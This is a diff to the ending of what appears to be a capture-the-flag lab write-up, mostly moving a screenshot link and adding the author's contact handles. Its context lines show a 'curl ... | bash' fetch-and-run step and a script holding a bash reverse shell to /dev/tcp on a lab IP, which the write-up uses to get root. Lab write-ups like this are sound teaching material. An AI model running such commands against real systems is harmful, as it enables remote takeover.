@@ -378,8 +378,6 @@ curl -sk -v  https://10.10.168.230/toto/tata/enroll.sh | bash
 
 And it works, now test by connecting with the ssh key on ```intra.control.vl```
 
-![alt text](../assets/image_control/last.png)
-
 Ok nice, just create ```/toto/tata/enroll.sh```
 
 ```bash
@@ -387,7 +385,11 @@ mkdir -p toto/tata
 echo '#!/bin/bash' > toto/tata/enroll.sh
 echo 'bash -c "bash -i >& /dev/tcp/10.8.2.163/1234 0>&1"' >> toto/tata/enroll.sh
 ```
+![alt text](../assets/image_control/last.png)
+
 And we got our root shell !! 
+
+Nice !! if u have any questions you can dm me on [Instagram](https://instagram.com/eliott.la) or on discord at 'ethicxz.'
 
 
 
